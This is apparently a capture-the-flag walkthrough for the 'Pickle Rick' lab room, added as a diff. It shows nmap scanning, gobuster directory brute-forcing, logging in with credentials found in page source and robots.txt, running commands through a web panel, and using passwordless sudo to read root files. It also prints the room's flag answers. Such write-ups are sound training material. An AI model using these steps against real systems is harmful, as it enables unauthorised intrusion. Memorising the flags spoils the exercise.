@@ -1,0 +1,82 @@
+> Command 
+Use nmap command to get the open ports on the IP address 
+nmap -sC -v <IP address>
+explanation 
+-sC runs the default script scan gives information of the ports without creating a noise on the attackers system 
+-v is the verbose mode where we get more detailed information
+result 
+22/tcp open  ssh
+80/tcp open  http
+As the IP address have active http servies on port 80, open the website from firefox browser as http://<IP address>
+right click >> View page source 
+from the page source information we got 
+``Username: R1ckRul3s``
+Next step is to perform Directory brute-force the website
+Use tools like 
+gobuster, dirb, dirsearch
+``
+gobuster dir -u 10.49.149.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+``
+explaination 
+gobuster is used for:Directory brute-forcing, File brute-forcing, DNS subdomain brute-forcing
+dir This tells Gobuster: “I want to brute-force directories and files, not DNS or vhosts.”
+-u = URL, This is the website Gobuster will attack
+-w = wordlist
+/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt path for wordlist which is perinstalled on Kali 
+`What Gobuster is actually doing behind the scenes
+
+For each word in the list, Gobuster:
+
+Sends an HTTP request
+
+Checks the response code
+
+Reports interesting results`
+
+Result : /assets               (Status: 301) [Size: 311] [--> http://10.49.149.2/assets/]
+
+As we haven't found much information from the /assests we can use the most commonly used directories like robots.txt , login.php
+from http://Target IP address/robots.txt  we got "Wubbalubbadubdub"
+from http://Target IP address/login.php we got login page 
+
+From the information gathered ``Username: R1ckRul3s`` and ``Wubbalubbadubdub`` we are able to login and got a command page. 
+
+Now let perform comman linux command to get more information 
+whoami 
+-www-data
+ls 
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+cat Sup3rS3cretPickl3Ingred.txt
+cat command disabled 
+less Sup3rS3cretPickl3Ingred.txt
+``mr. meeseek hair`` >> 1STINGREDIENT 
+less clue.txt 
+Look around the file system for the other ingredient.
+As per the clue let's check for the file system 
+ls /home
+rick, Ubuntu 
+ls /home/rick
+second ingredient
+less /home/rick/"second ingredient" - add "" as there is space in the file name 
+``1 jerry tear``
+Now check for the 3rd ingredient 
+As we have checked for all the avaible txt files in the file system, now lets look for the root directory 
+check for sudo permissions by doing sudo -l 
+sudo -l lets a user:
+See what they are allowed to do
+Understand their privilege level
+result - (ALL) NOPASSWD: ALL
+explanation - This user can run ANY command as ANY user, WITHOUT entering a password.
+sudo ls /root 
+result - 
+3rd.txt
+snap
+sudo less /root/3rd.txt 
+result - 3rd ingredients: fleeb juice
